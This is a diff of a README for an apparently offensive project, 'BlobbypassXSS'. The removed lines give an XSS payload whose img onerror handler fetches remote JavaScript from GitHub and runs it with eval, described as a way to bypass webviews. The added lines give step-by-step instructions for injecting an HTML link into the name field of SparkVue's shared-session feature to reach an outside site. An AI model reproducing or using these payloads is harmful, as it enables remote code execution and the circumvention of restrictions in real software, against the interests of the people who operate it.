@@ -1,5 +1,13 @@
-# BlobbypassXSS
-## Some XSS that can be used for multiple webview bypasses.
+
+Step 1: Copy this code:
 ```
-<img src=# onerror='fetch("https://raw.githubusercontent.com/Blobby-Boi/BlobbypassXSS/main/main.js").then(r=>r.text()).then(c=>eval(c)) '>
+<a href="https://sites1235.github.io/BlobbypassXSS">Blobbypass</a>
 ```
+Step 2: Open SparkVue
+Step 3: Click the 3 lines on the top left
+Step 4: Click Shared Session
+Step 5: Click on the 2nd Start a shared session button
+Step 6: Paste the code in Your Name
+Step 7: Type anything you want for Session Name
+Step 8: Click Select sparklab, Experiments, Essential Chemistry, 02B
+Step 9: Click on Blobbypass on the right
